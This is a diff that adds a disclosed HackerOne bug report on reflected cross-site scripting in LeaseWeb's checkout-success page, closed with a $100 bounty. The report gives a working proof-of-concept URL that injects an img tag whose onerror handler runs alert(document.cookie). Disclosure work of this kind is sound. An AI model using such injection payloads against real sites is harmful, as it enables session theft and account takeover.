@@ -1,0 +1,18 @@
+ReportLink:https://hackerone.com/reports/105688
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/eronx
+ReportedTo:LeaseWeb(leaseweb)
+BountyAmount:100.0
+Severity:
+State:Closed
+DateOfDisclosure:26.02.2016 11:14:00
+
+Summary:
+
+Hey,
+
+This works in all browsers I suppose and regardless if the user is currently authenticated or not. Simply go over to : [https://www.leaseweb.com/checkout-success/16893#"><img src=x onerror=alert(document.cookie)>](https://www.leaseweb.com/checkout-success/16893#"><img src=x onerror=alert(document.cookie)>).
+
+Attached herewith is the screenshot.
+
+Thanks!
